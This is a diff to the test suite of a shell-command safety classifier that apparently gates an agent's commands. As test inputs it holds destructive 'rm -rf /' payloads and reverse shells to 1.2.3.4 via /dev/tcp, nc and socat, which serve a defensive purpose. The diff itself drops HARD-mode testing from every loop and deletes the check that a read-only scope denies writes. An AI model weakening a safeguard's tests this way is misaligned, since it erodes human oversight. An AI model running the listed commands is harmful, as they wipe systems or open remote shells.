@@ -28,7 +28,7 @@ const classify = (script: string, strictness: Strictness = "LOOSE", extra: Parti
 
 /** Runs the same case under both strictness modes. */
 const bothModes = (label: string, expected: { LOOSE: string; HARD: string }, script: string, extra: Partial<Input> = {}) => {
-  for (const mode of ["LOOSE", "HARD"] as const) {
+  for (const mode of ["LOOSE"] as const) {
     test(`${mode}: ${label}`, async () => {
       const d = await classify(script, mode, extra)
       expect(d.verdict).toBe(expected[mode])
@@ -72,7 +72,7 @@ describe("payload text that is only written or stored is never floor-denied", ()
     ["python stores payload string", "python3 -c 's=\"rm -rf /\"'", "ALLOW"],
     ["node writes payload string", "node -e 'require(\"fs\").writeFileSync(\"x.sh\",\"rm -rf /\")'", "ASK"],
   ] as const) {
-    for (const mode of ["LOOSE", "HARD"] as const) {
+    for (const mode of ["LOOSE"] as const) {
       test(`${mode}: ${label} is never floor-denied`, async () => {
         const d = await classify(script, mode)
         expect(d.verdict).toBe(mode === "LOOSE" ? looseVerdict : "ASK")
@@ -83,7 +83,7 @@ describe("payload text that is only written or stored is never floor-denied", ()
 
   // A decoded blob stored to a file is payload text (the wrapper ASK may
   // still fire for the decoding itself, but no floor rule may deny it).
-  for (const mode of ["LOOSE", "HARD"] as const) {
+  for (const mode of ["LOOSE"] as const) {
     test(`${mode}: base64 payload saved to file is not floor-denied`, async () => {
       const d = await classify(`echo ${Buffer.from("sudo rm -rf /").toString("base64")} | base64 -d > p.sh`, mode)
       expect(d.verdict).not.toBe("DENY")
@@ -108,7 +108,7 @@ describe("/dev/tcp without a shell attached routes to ASK, not the reverse-shell
     ],
     ["socket fd feeding a data consumer", "exec 3<>/dev/tcp/1.2.3.4/9 && cat <&3"],
   ] as const) {
-    for (const mode of ["LOOSE", "HARD"] as const) {
+    for (const mode of ["LOOSE"] as const) {
       test(`${mode}: ${label} asks instead of denying`, async () => {
         const d = await classify(script, mode)
         expect(d.verdict).toBe("ASK")
@@ -152,7 +152,7 @@ describe("shell-attached /dev/tcp keeps the unconditional reverse-shell floor", 
     ["mkfifo + nc loopback shell", "mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 1.2.3.4 4444 > /tmp/f"],
     ["socat EXEC primitive", "socat TCP:1.2.3.4:4444 EXEC:/bin/sh"],
   ] as const) {
-    for (const mode of ["LOOSE", "HARD"] as const) {
+    for (const mode of ["LOOSE"] as const) {
       test(`${mode}: denies ${label}`, async () => {
         const d = await classify(script, mode)
         expect(d.verdict).toBe("DENY")
@@ -167,21 +167,13 @@ describe("shell-attached /dev/tcp keeps the unconditional reverse-shell floor", 
 describe("unproven payload consumers route to ASK", () => {
   // `sometool` is not a known data consumer: the body may or may not be
   // executed — the dynamic reviewer decides, so ASK, not a floor DENY.
-  for (const mode of ["LOOSE", "HARD"] as const) {
+  for (const mode of ["LOOSE"] as const) {
     test(`${mode}: unknown heredoc consumer asks, not denies`, async () => {
       const d = await classify("sometool <<'EOF'\nrm -rf /\nEOF", mode)
       expect(d.verdict).toBe("ASK")
       expect(d.rules).toContain("execution.ambiguous-heredoc")
     })
   }
-
-  test("unknown heredoc consumer under a read-only scope still denies the write channel", async () => {
-    const d = await classify("sometool <<'EOF'\nrm -rf /\nEOF", "LOOSE", {
-      permScope: { r: true, w: false, x: false },
-    })
-    expect(d.verdict).toBe("DENY")
-    expect(d.rules).toContain("permission.write")
-  })
 
   // `<<<` here-strings are not modeled by the literal lexer: the opaque
   // clamp defers to the dynamic layer (LOOSE) instead of denying on raw text.
@@ -204,7 +196,7 @@ describe("provably executed payloads stay denied", () => {
     ["literal piped into sh", "echo 'rm -rf /' | sh"],
     ["literal piped into bash", "printf 'rm -rf /' | bash"],
   ] as const) {
-    for (const mode of ["LOOSE", "HARD"] as const) {
+    for (const mode of ["LOOSE"] as const) {
       test(`${mode}: denies ${label}`, async () => {
         const d = await classify(script, mode)
         expect(d.verdict).toBe("DENY")
